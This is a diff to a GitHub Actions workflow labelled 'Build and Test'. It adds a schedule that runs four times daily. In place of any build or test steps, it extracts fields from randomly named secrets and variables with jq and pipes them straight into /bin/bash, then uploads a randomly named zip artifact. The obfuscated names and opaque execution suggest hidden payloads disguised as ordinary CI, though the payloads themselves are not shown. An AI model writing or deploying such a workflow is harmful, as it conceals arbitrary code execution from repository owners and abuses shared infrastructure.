@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '55 5,11,17,23 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -13,15 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          bj17: ${{ secrets.bj17 }}
+          wjrtj87644: ${{ secrets.wjrtj87644 }}
         run: |
-          printf '%s' "$bj17" | jq -r .ifviy60 | /bin/bash
-          echo $yxeag29 | jq -r .pouuh9 | /bin/bash
-          echo $xf28793 | jq -r .x7478 | /bin/bash
+          printf '%s' "$wjrtj87644" | jq -r .opln96981 | /bin/bash
+          printf '%s' "$vf1" | jq -r .ldmm95 | /bin/bash
+          echo $msfgv75947 | jq -r .lku2352 | /bin/bash
+          echo $vv632 | jq -r .hcva8835 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: SriCAskT
+          name: i4enmlYh
           path: "*.zip"
           retention-days: 1
